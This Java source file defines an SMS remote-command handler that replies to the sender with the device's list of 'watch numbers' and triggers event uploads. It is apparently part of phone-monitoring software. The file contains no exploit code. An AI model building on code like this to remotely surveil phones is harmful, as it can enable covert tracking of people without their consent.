package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSQueryWatchNumb extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSQueryWatchNumb(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getQueryWatchNumberCmd());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.WATCH_NUMBER);
//			int countWatchNumDatabase = watchNumDatabase.countWatchNumber();
			int countWatchNumDatabase = prefWatchList.countWatchNumber();
			for (int i = 0; i < countWatchNumDatabase; i++) {
				responseMessage.append(Constant.CRLF);
//				responseMessage.append(watchNumDatabase.getWatchNumber(i));				
				responseMessage.append(prefWatchList.getWatchNumber(i));
			}
		} catch(Exception e) {
			Log.error("SMSQueryWatchNumberCmd.execute()", e.getMessage());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSQueryWatchNumberCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
